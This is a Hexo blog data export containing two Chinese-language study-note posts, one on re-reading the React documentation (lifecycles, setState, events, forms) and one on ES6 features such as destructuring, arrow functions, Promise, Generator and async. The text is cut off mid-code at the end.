{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"重读React文档的一些记录","slug":"重读React文档的一些记录","date":"2020-01-22T04:17:37.000Z","updated":"2020-01-22T14:02:12.001Z","comments":true,"path":"2020/01/22/重读React文档的一些记录/","link":"","permalink":"http://yoursite.com/2020/01/22/重读React文档的一些记录/","excerpt":"","text":"React.Component组件生命周期常用生命周期的图谱如下所示： 组件实例被创建并插入DOM中时，其生命周期调用顺序为： constructor(props) static getDerivedStateFromProps(props, state) render() componentDidMount() getDerivedStateFromProps()在初始挂载以及后续更新时都会被调用（每次渲染前都会触发此方法），不常用，可以让组件在props变化时更新state，这种派生state需要保守使用，而且如果一个派生state的值也被setState更新，那这个值就不是单一来源了。如果要在props更改时重置某些state可以使组件完全受控或者使用key使组件完全不受控。 componentDidUpdate(prevProps, preState, snapshot)会在更新后立即被调用，首次渲染不会执行。注意如果在componentDidUpdate()中调用setState()要在外面套条件语句，对更新前后的props进行比较，否则会死循环和额外渲染。 getSnapshotBeforeUpdate() 在最近一次渲染输出（提交到 DOM 节点）之前调用，使得组件能在发生更改之前从 DOM 中捕获一些信息（如滚动位置）。 如果组件实现了 getSnapshotBeforeUpdate() 生命周期（不常用），则它的返回值将作为 componentDidUpdate() 的第三个参数 “snapshot” 传递。 componentWillMount()，componentWillReceiveProps()，componentWillUpdate() “已过时”不建议使用。 setState()setState()异步更新可以接收对象或者函数作为第一个参数，当需要基于之前的state和props更新当前state（后续状态取决于当前状态，避免合并覆盖）则需传入updater函数作为参数。 12345678910//setState(updater[, callback])//example1this.setState((state) =&gt; &#123; return &#123; quantity: state.quantity + 1 &#125;;&#125;);//example2this.setState((state, props) =&gt; &#123; //参数为上一个state值和此次更新被应用时的props return &#123; counter: state.counter + props.step &#125;;&#125;); 为什么setState是异步批量更新？ 保持内部一致性：React对象的state、props、refs属性在内部是一致的；而props的更新是异步的，因为在父组件重新渲染时传入子组件的props才改变，如果state立即更新，显然此时props还没变，为了保持一致性就不得不在每次改变state的时候立即重新渲染组件，这样做是不够合理的。 立即同步更新会带来性能损失，因为这样导致组件的反复渲染。 存在视觉效果和体验上的问题，比如多个组件同时更改loading状态会导致页面闪烁；在输入消息的时候需要立即调用TextBox组件的setState，如果此时接收到了新消息，将新消息的渲染延迟到某个阈值可能比直接阻塞线程更好。 参考：关于setState异步更新的issue props属性props只读，所有 React 组件都必须像纯函数一样保护它们的 props 不被更改。 this.props.children是一个特殊的prop，通常由JSX表达式中的子组件构成，非自定义。 事件处理绑定this给事件处理函数绑定this的“实验性”语法： 12345678910111213class Example extends React.Component &#123; handleClick = () =&gt; &#123; console.log(this); &#125; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125;&gt; click me &lt;/button&gt; ) &#125;&#125; 传参1234//事件对象e作为第二个参数被传递&lt;button onClick=&#123;(e) =&gt; this.handleClick0(id, e)&#125;&gt;click0&lt;/button&gt;//通过bind方式绑定事件对象及其他参数被隐式传递&lt;button onClick=&#123;this.handleClick1.bind(this, id)&#125;&gt;click1&lt;/button&gt; 合成事件SyntheticEventSyntheticEvent 是浏览器原生事件的跨浏览器包装器。除兼容所有浏览器外，它还拥有和浏览器原生事件相同的接口，包括 stopPropagation() 和 preventDefault()。 合成对象属性SyntheticEvent 对象都包含以下属性： 1234567891011121314boolean bubblesboolean cancelableDOMEventTarget currentTargetboolean defaultPreventednumber eventPhaseboolean isTrustedDOMEvent nativeEventvoid preventDefault()boolean isDefaultPrevented()void stopPropagation()boolean isPropagationStopped()DOMEventTarget targetnumber timeStampstring type 注：由于SyntheticEvent对象可能会被重用，且在事件回调函数被调用后所有属性会无效，所以不能异步访问事件。若想异步访问事件属性需要在事件上调用event.persist()，此方法会从事件池中移除合成事件，允许保留对事件的引用。 12345678910111213141516function onClick(event) &#123; console.log(event); // =&gt; nullified object. console.log(event.type); // =&gt; \"click\" const eventType = event.type; // =&gt; \"click\" setTimeout(function() &#123; console.log(event.type); // =&gt; null console.log(eventType); // =&gt; \"click\" &#125;, 0); // 不起作用，this.state.clickEvent 值为 null this.setState(&#123;clickEvent: event&#125;); // 仍然可以导出事件属性 this.setState(&#123;eventType: event.type&#125;);&#125; 常用事件 Form Events：onChange onInput onInvalid onSubmit onChange通过event.target.value或者event.target.checked获取值 Focus Events：onFocus onBlur （在React DOM上的所有元素都有效） Keyboard Events：onKeyDown onKeyPress onKeyUp 可能用到的属性：key，keyCode，charCode Mouse Events：onClick onContextMenu onDoubleClick onDrag onDragEnd onDragEnter onDragExitonDragLeave onDragOver onDragStart onDrop onMouseDown onMouseEnter onMouseLeaveonMouseMove onMouseOut onMouseOver onMouseUp 可能用到的属性：screenX，screenY，clientX，clientY Select Event：onSelect Touch Events：onTouchCancel onTouchEnd onTouchMove onTouchStart 可能用到的属性：touches，targetTouches，changedTouches UI Event：OnScroll 属性：detail，view Media Events：onAbort onCanPlay onCanPlayThrough onDurationChange onEmptied onEncryptedonEnded onError onLoadedData onLoadedMetadata onLoadStart onPause onPlayonPlaying onProgress onRateChange onSeeked onSeeking onStalled onSuspendonTimeUpdate onVolumeChange onWaiting Image Events：onLoad onError Animation Events：onAnimationStart onAnimationEnd onAnimationIteration Transition Event：onTransitionEnd Toggle Event：onToggle Clipboard Events：onCopy onCut onPaste 属性：clipboardData 条件渲染使用&amp;&amp;运算符如果条件是 true，&amp;&amp; 右侧的元素就会被渲染；如果是 false，React 会忽略并跳过它。 12345678910111213function Mailbox(props) &#123; const unreadMessages = props.unreadMessages; return ( &lt;div&gt; &lt;h1&gt;Hello!&lt;/h1&gt; &#123;unreadMessages.length &gt; 0 &amp;&amp; &lt;h2&gt; You have &#123;unreadMessages.length&#125; unread messages. &lt;/h2&gt; &#125; &lt;/div&gt; );&#125; 阻止组件渲染可以让 render 方法直接返回 null，而不进行任何渲染。 1234567891011function Example(props) &#123; if (!props.flag) &#123; return null; &#125; return ( &lt;div className=\"test\"&gt; render! &lt;/div&gt; );&#125; 在组件的 render 方法中返回 null 并不会影响组件的生命周期。 表单受控组件受控组件中的表单数据由React组件管理，使 React 的 state 成为“唯一数据源”，大多数情况下都使用受控组件来处理表单数据。 非受控组件非受控组件中的数据交由DOM节点处理，使用ref从DOM节点中获取表单数据，可以指定defaultValue属性赋予组件初始值。 &lt;input type=&#39;file&#39; /&gt; 始终是一个非受控组件，因为它的值只能由用户设置，而不能通过代码控制。（附：DOM File API文档 ） 12345678910111213141516171819202122232425262728class FileInput extends React.Component &#123; constructor(props) &#123; super(props); this.handleSubmit = this.handleSubmit.bind(this); this.fileInput = React.createRef(); &#125; handleSubmit(event) &#123; event.preventDefault(); alert( `Selected file - $&#123; this.fileInput.current.files[0].name &#125;` ); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Upload file: &lt;input type=\"file\" ref=&#123;this.fileInput&#125; /&gt; &lt;/label&gt; &lt;br /&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt; &lt;/form&gt; ); &#125;&#125; 由于非受控组件将真实数据存储在DOM节点中，所以在使用非受控组件时，有时候反而更容易同时集成 React 和非 React 代码。 如果表单数据比较简单可能适合使用非受控的方式，但大多数情况下还是使用受控组件。 关于受控和非受控组件的适用场景，参考这篇文章：链接 ContextContext 提供了一个无需为每层组件添加 props，就能在组件树间进行数据传递的方法，适用于全局共享的属性。","categories":[],"tags":[{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"ES6常用新特性整理","slug":"ES6常用新特性整理","date":"2019-08-06T08:16:50.000Z","updated":"2019-08-15T11:48:49.006Z","comments":true,"path":"2019/08/06/ES6常用新特性整理/","link":"","permalink":"http://yoursite.com/2019/08/06/ES6常用新特性整理/","excerpt":"","text":"ES6常用新特性整理letlet与var的不同 let所声明的变量只在所在的块级作用域有效。比如花括号内，还有for循环每轮循环的i都是新的变量，而且设置循环变量的部分是父作用域，而循环体内部是单独的子作用域，两者也是互不干扰的。 let不存在变量提升，变量必须要在声明之后才能使用。 只要块级作用域内使用let声明了变量，那么这个变量就被绑定到这个区域，不受外部影响。 不允许重复声明。 块级作用域let实际上为JS在全局作用域和函数作用域的基础上新增了块级作用域。同一个变量名可以在不同的层级重新声明，每一层都是一个单独的作用域，互不影响。 1234567function f() &#123; let n = 1; if (true) &#123; let n = 2; &#125; console.log(n); // 1&#125; ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明，如if(true){}，try{}catch(e){}。 ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6 规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。 ES6 的块级作用域必须有大括号，如果没有大括号，JavaScript 引擎就认为不存在块级作用域。 注：考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。 const 只读的常量，声明后值不变 声明变量时必须初始化，声明不赋值会报错 变量不提升，先声明后使用 const的本质是变量指向的内存地址所保存的数据不得改动，对于复合类型的数据如对象和数组，变量指向的内存地址保存的是指向实际数据的指针，const保证这个指针不变，所以给对象添加新属性并不会报错。 解构赋值数组的解构赋值类似模式匹配，只要等号两边的模式相同，左边的变量就会被赋予对应的值。 1234let [x, y, ...z] = ['a'];x // \"a\"y // undefinedz // [] 如果等号右边不是可遍历的结构，那么将会报错。 1234567// 报错let [foo] = 1;let [foo] = false;let [foo] = NaN;let [foo] = undefined;let [foo] = null;let [foo] = &#123;&#125;; 上面的语句都会报错，因为等号右边的值要么转为对象以后不具备 Iterator 接口，要么本身就不具备 Iterator 接口。 事实上，只要某种数据结构具有 Iterator 接口，都可以采用数组形式的解构赋值。 例如下面这个Generator函数： 1234567891011function* fibs() &#123; let a = 0; let b = 1; while (true) &#123; yield a; [a, b] = [b, a + b]; &#125;&#125;let [first, second, third, fourth, fifth, sixth] = fibs();sixth // 5 默认值：只有解构被赋予的值严格等于undefined才生效，并且如果能直接取到非undefined的值就不会去求默认值。 12345let [x = 1] = [undefined];x // 1let [x = 1] = [null];x // null 对象的解构赋值与数组的解构赋值类似 123456let &#123; bar, foo &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;foo // \"aaa\"bar // \"bbb\"let &#123; baz &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;baz // undefined 如果变量名与属性名不一致用以下写法： 1234let obj = &#123; first: 'hello', last: 'world' &#125;;let &#123; first: f, last: l &#125; = obj;f // 'hello'l // 'world' 对象的解构赋值是下面形式的简写： 1let &#123; foo: foo, bar: bar &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;; 对象解构赋值的内部机制是先找到同名属性，然后再赋给对应的变量。真正被赋值的是后者，而不是前者。 123let &#123; foo: baz &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;baz // \"aaa\"foo // error: foo is not defined 在上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。 函数参数的解构赋值12345678function move(&#123;x = 0, y = 0&#125; = &#123;&#125;) &#123; return [x, y];&#125;move(&#123;x: 3, y: 8&#125;); // [3, 8]move(&#123;x: 3&#125;); // [3, 0]move(&#123;&#125;); // [0, 0]move(); // [0, 0] 字符串字符串遍历器接口123for (let char of 'hello') &#123; console.log(char)&#125; 模板字符串12345info = &#123; name: 'nancy', desc: 'hahaha'&#125;let str = `Hi, i'm $&#123;info.name&#125;! $&#123;info.desc&#125;~`; 1234567//这里的空格和缩进都会保留$('#list').html(`&lt;ul&gt; &lt;li&gt;first&lt;/li&gt; &lt;li&gt;second&lt;/li&gt;&lt;/ul&gt;`); 模板字符串之中还能调用函数 12345function fn() &#123; return \"Hello World\";&#125;`$&#123;fn()&#125;` // Hello World includes(), startsWith(), endsWith() includes()：返回布尔值，表示是否找到了参数字符串。 startsWith()：返回布尔值，表示参数字符串是否在原字符串的头部。 endsWith()：返回布尔值，表示参数字符串是否在原字符串的尾部。 函数的扩展箭头函数ES6 允许使用“箭头”（=&gt;）定义函数。 1234567891011121314151617var f = v =&gt; v;// 等同于var f = function (v) &#123; return v;&#125;;var sum = (num1, num2) =&gt; num1 + num2;// 等同于var sum = function(num1, num2) &#123; return num1 + num2;&#125;;[1,2,3].map(function (x) &#123; return x * x;&#125;);// 等同于[1,2,3].map(x =&gt; x * x); 注意点： 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象；this会绑定定义时所在的作用域，而不是运行时所在的作用域。 this指向的固定化，并不是因为箭头函数内部有绑定this的机制，实际上是箭头函数根本没有自己的this，导致内部的this就是外层代码块的this。正是因为它没有this，所以也就不能用作构造函数。 123456789101112131415function foo() &#123; return () =&gt; &#123; return () =&gt; &#123; return () =&gt; &#123; console.log('id:', this.id); &#125;; &#125;; &#125;;&#125;var f = foo.call(&#123;id: 1&#125;);var t1 = f.call(&#123;id: 2&#125;)()(); // id: 1var t2 = f().call(&#123;id: 3&#125;)(); // id: 1var t3 = f()().call(&#123;id: 4&#125;); // id: 1 上面代码之中，只有一个this，就是函数foo的this，所以t1、t2、t3都输出同样的结果。因为所有的内层函数都是箭头函数，都没有自己的this，它们的this其实都是最外层foo函数的this。 不可以当作构造函数，不可以使用new命令 。 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。 不可以使用yield命令，因此箭头函数不能用作 Generator 函数。 箭头函数不适用的场景： 不适于定义对象的方法： 123456const obj = &#123; count: 0, add: () =&gt; &#123; this.count++; &#125;&#125; 这里的obj.add()使用了箭头函数，在调用obj.add()的时候this会指向全局对象，因为对象不构成单独的作用域，导致add方法定义时的作用域就是全局作用域，所以这里不能使用箭头函数。 不适于需要动态this的场合： 1234let button = document.getElementById('press');button.addEventListener('click', () =&gt; &#123; this.classList.toggle('on');&#125;); 上面代码运行时，点击按钮会报错，因为button的监听函数是一个箭头函数，导致里面的this就是全局对象。如果改成普通函数，this就会动态指向被点击的按钮对象。 rest参数形为：...变量名 1const sortNumbers = (...numbers) =&gt; numbers.sort(); 注意rest 参数之后不能再有其他参数（即只能是最后一个参数），否则报错。 1234// 报错function f(a, ...b, c) &#123; // ...&#125; 数组的扩展扩展运算符扩展运算符（spread）是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。 123let arr1 = [0, 1, 2];let arr2 = [3, 4, 5];arr1.push(...arr2); Array.from()Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象。 123456789101112let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] 任何有length属性的对象，都可以通过Array.from方法转为数组 12Array.from(&#123; length: 3 &#125;);// [ undefined, undefined, undefined ] Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。 123456Array.from(arrayLike, x =&gt; x * x);// 等同于Array.from(arrayLike).map(x =&gt; x * x);Array.from([1, 2, 3], (x) =&gt; x * x)// [1, 4, 9] Array.of()Array.of方法用于将一组值，转换为数组。 Array.of总是返回参数值组成的数组；如果没有参数，就返回一个空数组。 123Array.of() // []Array.of(1) // [1]Array.of(undefined) // [undefined] find() 和 findIndex()数组实例的find方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员。如果没有符合条件的成员，则返回undefined。 find方法的回调函数可以接受三个参数，依次为当前的值、当前的位置和原数组。 123[1, 5, 10, 15].find(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 10 数组实例的findIndex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1。 includes()includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似。 对象的扩展属性简洁表示ES6 允许直接写入变量和函数，作为对象的属性和方法。 12345678910111213141516const foo = 'bar';const baz = &#123;foo&#125;;baz // &#123;foo: \"bar\"&#125;const o = &#123; method() &#123; return \"Hello!\"; &#125;&#125;;// 等同于const o = &#123; method: function() &#123; return \"Hello!\"; &#125;&#125;; CommonJS 模块输出一组变量，就非常合适使用简洁写法。 12345678910111213let ms = &#123;&#125;;function getItem (key) &#123; return key in ms ? ms[key] : null;&#125;function setItem (key, value) &#123; ms[key] = value;&#125;function clear () &#123; ms = &#123;&#125;;&#125;module.exports = &#123; getItem, setItem, clear &#125;; super 关键字指向当前对象的原型对象。 super关键字表示原型对象时，只能用在对象的方法之中，用在其他地方都会报错。 12345678910111213const proto = &#123; foo: 'hello'&#125;;const obj = &#123; foo: 'world', find() &#123; return super.foo; &#125;&#125;;Object.setPrototypeOf(obj, proto);obj.find() // \"hello\" Object.assign()Object.assign方法用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）。 Object.assign方法的第一个参数是目标对象，后面的参数都是源对象。 1234567const target = &#123; a: 1 &#125;;const source1 = &#123; b: 2 &#125;;const source2 = &#123; c: 3 &#125;;Object.assign(target, source1, source2);target // &#123;a:1, b:2, c:3&#125; Object.assign拷贝的属性是有限制的，只拷贝源对象的自身属性（不拷贝继承属性），也不拷贝不可枚举的属性（enumerable: false）。 注意点： Object.assign方法实行的是浅拷贝，而不是深拷贝。也就是说，如果源对象某个属性的值是对象，那么目标对象拷贝得到的是这个对象的引用。 12345const obj1 = &#123;a: &#123;b: 1&#125;&#125;;const obj2 = Object.assign(&#123;&#125;, obj1);obj1.a.b = 2;obj2.a.b // 2 对于同名属性，Object.assign的处理方法是替换而不是添加。 1234const target = &#123; a: &#123; b: 'c', d: 'e' &#125; &#125;const source = &#123; a: &#123; b: 'hello' &#125; &#125;Object.assign(target, source)// &#123; a: &#123; b: 'hello' &#125; &#125; Object.assign可以用来处理数组，但是会把数组视为对象。 12Object.assign([1, 2, 3], [4, 5])// [4, 5, 3] 上面代码中，Object.assign把数组视为属性名为 0、1、2 的对象，因此源数组的 0 号属性4覆盖了目标数组的 0 号属性1。 Object.keys()，Object.values()，Object.entries()Object.keys方法，返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键名。 Object.values方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值。 Object.entries()方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值对数组。 SymbolSymbol()，getOwnPropertySymbols()ES6 引入了一种新的原始数据类型Symbol，表示独一无二的值。它是 JavaScript 语言的第七种数据类型，前六种是：undefined、null、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）。 Symbol 值通过Symbol函数生成。 凡是属性名属于 Symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。 Symbol 作为属性名，该属性不会出现在for...in、for...of循环中，也不会被Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回。但是，它也不是私有属性，有一个Object.getOwnPropertySymbols方法，可以获取指定对象的所有 Symbol 属性名。 Object.getOwnPropertySymbols方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值。 1234567891011const obj = &#123;&#125;;let a = Symbol('a');let b = Symbol('b');obj[a] = 'Hello';obj[b] = 'World';const objectSymbols = Object.getOwnPropertySymbols(obj);objectSymbols// [Symbol(a), Symbol(b)] 另一个新的 API，Reflect.ownKeys方法可以返回所有类型的键名，包括常规键名和 Symbol 键名。 12345678let obj = &#123; [Symbol('my_key')]: 1, enum: 2, nonEnum: 3&#125;;Reflect.ownKeys(obj)// [\"enum\", \"nonEnum\", Symbol(my_key)] Symbol.for()，Symbol.keyFor()有时，我们希望重新使用同一个 Symbol 值，Symbol.for方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有，就返回这个 Symbol 值，否则就新建并返回一个以该字符串为名称的 Symbol 值。 1234let s1 = Symbol.for('foo');let s2 = Symbol.for('foo');s1 === s2 // true Symbol.for()与Symbol()这两种写法，都会生成新的 Symbol。它们的区别是，前者会被登记在全局环境中供搜索，后者不会。Symbol.for()不会每次调用就返回一个新的 Symbol 类型的值，而是会先检查给定的key是否已经存在，如果不存在才会新建一个值。 12345Symbol.for(\"bar\") === Symbol.for(\"bar\")// trueSymbol(\"bar\") === Symbol(\"bar\")// false Symbol.keyFor方法返回一个已登记的 Symbol 类型值的key。 12345let s1 = Symbol.for(\"foo\");Symbol.keyFor(s1) // \"foo\"let s2 = Symbol(\"foo\");Symbol.keyFor(s2) // undefined Set和MapSet的基本属性和方法Set 结构的实例有以下属性： Set.prototype.constructor：构造函数，默认就是Set函数。 Set.prototype.size：返回Set实例的成员总数。 Set 实例的方法分为两大类：操作方法（用于操作数据）和遍历方法（用于遍历成员）。 Set.prototype.add(value)：添加某个值，返回 Set 结构本身。 Set.prototype.delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。 Set.prototype.has(value)：返回一个布尔值，表示该值是否为Set的成员。 Set.prototype.clear()：清除所有成员，没有返回值。 Set.prototype.keys()：返回键名的遍历器 Set.prototype.values()：返回键值的遍历器 Set.prototype.entries()：返回键值对的遍历器 Set.prototype.forEach()：使用回调函数遍历每个成员 Map的基本属性和方法 size 属性 Map.prototype.set(key, value)：设置键名key对应的键值为value Map.prototype.get(key)：读取key对应的键值 Map.prototype.has(value)：返回一个布尔值 Map.prototype.delete(key) ：删除某个键，返回true；如果删除失败，返回false。 Map.prototype.clear()：清除所有成员，没有返回值。 遍历方法类似Set WeakSetWeakSet 结构与 Set 类似，也是不重复的值的集合。 但是WeakSet 的成员只能是对象，而不能是其他类型的值，并且WeakSet 中的对象都是弱引用，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中。 WeakSet 不能遍历，是因为成员都是弱引用，随时可能消失，遍历机制无法保证成员的存在，很可能刚刚遍历结束，成员就取不到了。WeakSet 的一个用处，是储存 DOM 节点，而不用担心这些节点从文档移除时，会引发内存泄漏。 WeakMapWeakMap结构与Map结构类似，也是用于生成键值对的集合。 WeakMap只接受对象作为键名（null除外），不接受其他类型的值作为键名，且WeakMap的键名所指向的对象，不计入垃圾回收机制（类似WeakSet）。 WeakMap的专用场合就是，它的键所对应的对象，可能会在将来消失。WeakMap结构有助于防止内存泄漏。 注：WeakMap 弱引用的只是键名，而不是键值，键值依然是正常引用。只要外部的引用消失，WeakMap 内部的引用，就会自动被垃圾回收清除。 123456789let myElement = document.getElementById('logo');let myWeakmap = new WeakMap();myWeakmap.set(myElement, &#123;timesClicked: 0&#125;);myElement.addEventListener('click', function() &#123; let logoData = myWeakmap.get(myElement); logoData.timesClicked++;&#125;, false); 上面代码中，myElement是一个 DOM 节点，每当发生click事件，就更新一下状态。我们将这个状态作为键值放在 WeakMap 里，对应的键名就是myElement。一旦这个 DOM 节点删除，该状态就会自动消失，不存在内存泄漏风险。 Promise123456789const promise = new Promise(function(resolve, reject) &#123; // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125;&#125;); Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。 Promise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数。 12345promise.then(function(value) &#123; // success&#125;, function(error) &#123; // failure，可选&#125;); then方法返回的是一个新的Promise实例。因此可以采用链式写法，即then方法后面再调用另一个then方法，这样就可以依次调用回调函数 。 12345getJSON(\"/posts.json\").then(function(json) &#123; return json.post;&#125;).then(function(post) &#123; // ...&#125;); 异步操作抛出错误，状态就会变为rejected，就会调用catch方法指定的回调函数，处理这个错误。then方法指定的回调函数在运行中抛出的错误也会被catch方法捕获。 123456getJSON('/posts.json').then(function(posts) &#123; // ...&#125;).catch(function(error) &#123; // 处理 getJSON 和 前一个回调函数运行时发生的错误 console.log('发生错误！', error);&#125;); 如果没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。 Promise.all方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。 1const p = Promise.all([p1, p2, p3]); p的状态由p1、p2、p3决定，分成两种情况： 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。 Promise.resolve 可以将现有对象转为 Promise 对象。 123Promise.resolve('foo')// 等价于new Promise(resolve =&gt; resolve('foo')) 如果不知道或者不想区分函数f是同步函数还是异步操作，但是想用 Promise 来处理它，即让同步函数同步执行，异步函数异步执行。 12345678const f = () =&gt; console.log('now');(async () =&gt; f())().then(...).catch(...)//或者const f = () =&gt; console.log('now');Promise.try(f); Promise.try就是模拟try代码块，就像promise.catch模拟的是catch代码块。 Iterator遍历器Iterator可以使数据按次序排列，并且主要为for…of循环提供接口。主要包括：Array，String，Map，Set，Object（大部分需要手动部署）。 12345var it = makeIterator(['a', 'b']);it.next() // &#123; value: \"a\", done: false &#125;it.next() // &#123; value: \"b\", done: false &#125;it.next() // &#123; value: undefined, done: true &#125; 默认的 Iterator 接口部署在数据结构的Symbol.iterator属性 ，一个数据结构只要具有Symbol.iterator属性，就可以认为是“可遍历的” 。Symbol.iterator属性本身是一个函数，就是当前数据结构默认的遍历器生成函数。执行这个函数，就会返回一个遍历器。 123456789101112131415const obj = &#123; [Symbol.iterator] : function () &#123; return &#123; next: function () &#123; return &#123; value: 1, done: true &#125;; &#125; &#125;; &#125;&#125;;let it = obj[Symbol.iterator]()it.next() //&#123;value: 1, done: true&#125; 12345678910111213141516171819let obj = &#123; data: [ 'hello', 'world' ], [Symbol.iterator]() &#123; const self = this; let index = 0; return &#123; next() &#123; if (index &lt; self.data.length) &#123; return &#123; value: self.data[index++], done: false &#125;; &#125; else &#123; return &#123; value: undefined, done: true &#125;; &#125; &#125; &#125;; &#125;&#125;; 让for…of可以遍历对象的办法： 123456789101112131415161718//方法一for (var key of Object.keys(someObject)) &#123; console.log(key + ': ' + someObject[key]);&#125;//方法二：使用Generator包装function* entries(obj) &#123; for (let key of Object.keys(obj)) &#123; yield [key, obj[key]]; &#125;&#125;for (let [key, value] of entries(obj)) &#123; console.log(key, '-&gt;', value);&#125;// a -&gt; 1// b -&gt; 2// c -&gt; 3 GeneratorGenerator 函数是一个状态机，封装了多个内部状态，并返回一个遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。 yield表达式只能用在 Generator 函数里面，用在其他地方都会报错。 123456789101112131415161718var arr = [1, [[2, 3], 4], [5, 6]];var flat = function* (a) &#123; var length = a.length; for (var i = 0; i &lt; length; i++) &#123; var item = a[i]; if (typeof item !== 'number') &#123; yield* flat(item); &#125; else &#123; yield item; &#125; &#125;&#125;;for (var f of flat(arr)) &#123; console.log(f);&#125;// 1, 2, 3, 4, 5, 6 与Iterator接口的关系： 12345678var myIterable = &#123;&#125;;myIterable[Symbol.iterator] = function* () &#123; yield 1; yield 2; yield 3;&#125;;[...myIterable] // [1, 2, 3] 利用 Generator 函数，可以在任意对象上部署 Iterator 接口。 12345678910111213141516function* iterEntries(obj) &#123; let keys = Object.keys(obj); for (let i=0; i &lt; keys.length; i++) &#123; let key = keys[i]; yield [key, obj[key]]; &#125;&#125;let myObj = &#123; foo: 3, bar: 7 &#125;;for (let [key, value] of iterEntries(myObj)) &#123; console.log(key, value);&#125;// foo 3// bar 7 Generator 函数和for...of循环，实现斐波那契数列的例子： 123456789101112function* fibonacci() &#123; let [prev, curr] = [0, 1]; for (;;) &#123; yield curr; [prev, curr] = [curr, prev + curr]; &#125;&#125;for (let n of fibonacci()) &#123; if (n &gt; 1000) break; console.log(n);&#125; yield*表达式用来在一个 Generator 函数里面执行另一个 Generator 函数。 12345function* bar() &#123; yield 'x'; yield* foo(); yield 'y';&#125; async基本用法async 是 Generator 函数的语法糖。 async函数将 Generator 函数的星号（*）替换成async，将yield替换成await。 async函数自带执行器 ；其返回值是 Promise 对象。 123456789101112131415161718192021222324252627// 函数声明async function foo() &#123;&#125;// 函数表达式const foo = async function () &#123;&#125;;// 对象的方法let obj = &#123; async foo() &#123;&#125; &#125;;obj.foo().then(...)// Class 的方法class Storage &#123; constructor() &#123; this.cachePromise = caches.open('avatars'); &#125; async getAvatar(name) &#123; const cache = await this.cachePromise; return cache.match(`/avatars/$&#123;name&#125;.jpg`); &#125;&#125;const storage = new Storage();storage.getAvatar('jake').then(…);// 箭头函数const foo = async () =&gt; &#123;&#125;; 注意点： await命令后面的Promise对象，运行结果可能是rejected，所以最好把await命令放在try...catch代码块中。 123456789101112131415async function myFunction() &#123; try &#123; await somethingThatReturnsAPromise(); &#125; catch (err) &#123; console.log(err); &#125;&#125;// 另一种写法async function myFunction() &#123; await somethingThatReturnsAPromise() .catch(function (err) &#123; console.log(err); &#125;);&#125; 多个await命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。 12345678// 写法一let [foo, bar] = await Promise.all([getFoo(), getBar()]);// 写法二let fooPromise = getFoo();let barPromise = getBar();let foo = await fooPromise;let bar = await barPromise; await命令只能用在async函数之中，如果用在普通函数，就会报错。 async 函数可以保留运行堆栈。 实现原理将 Generator 函数和自动执行器，包装在一个函数里。 1234567891011async function fn(args) &#123; // ...&#125;// 等同于function fn(args) &#123; return spawn(function* () &#123; //spawn函数是自动执行器 // ... &#125;);&#125; spawn函数的实现： 12345678910111213141516171819202122function spawn(genF) &#123; //传入generator函数 return new Promise(function(resolve, reject) &#123; const gen = genF(); function step(nextF) &#123; let next; try &#123; next = nextF(); &#125; catch(e) &#123; return reject(e); &#125; if(next.done) &#123; return resolve(next.value); &#125; Promise.resolve(next.value).then(function(v) 